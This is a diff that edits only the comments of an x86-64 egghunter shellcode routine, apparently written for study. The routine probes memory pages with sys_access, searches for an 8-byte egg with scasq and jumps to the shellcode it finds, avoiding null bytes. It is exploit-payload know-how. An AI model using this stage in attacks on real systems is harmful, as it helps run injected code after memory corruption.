@@ -10,13 +10,13 @@ setup_page:
     or  dx, 0xfff   ; setting lower 16 bits to 4095
 
 next_address:
-    inc rdx     ; moving it to 4096 while avoiding
-                ; null characters 0x00
+    inc rdx         ; moving it to 4096 while avoiding
+                    ; null characters 0x00
 
     xor rax, rax    ; zeroing out eax
-    mov rsi, rax    ; zero out int mode (param 2)
+    mov rsi, rax    ; zero out int mode in param 2
     add rax, 21     ; set rax to sys_access
-    mov rdi, rdx
+    mov rdi, rdx    ; moving memory address to param 1
 
     syscall         ; invoke sys_access
 
@@ -28,20 +28,20 @@ next_address:
                     ; to the next memory page and press on
 
     mov rax, 0xFCFCFCFCFCFCFCFC ; moving egg into eax in prep for searching
-    mov rdi, rdx
+    mov rdi, rdx                ; moving memory address into param 1
 
-    scasq
+    scasq            ; comparing egg with memory location
 
     jnz next_address ; if it dosent match increase memory by one byte
                      ; and try again
 
 
 
-    scasq
+    scasq            ; comparing egg with memory location
 
     jnz next_address ; if this is not zero it's not a match
                      ; so on we will press increasing memory one more byte
 
     jmp rdi      ; if we got this far then we found our egg and our
                  ; memory address is already at the right place due
-                 ; to scasq increasing by 4 bytes on each search
+                 ; to scasq so it's time to jump!
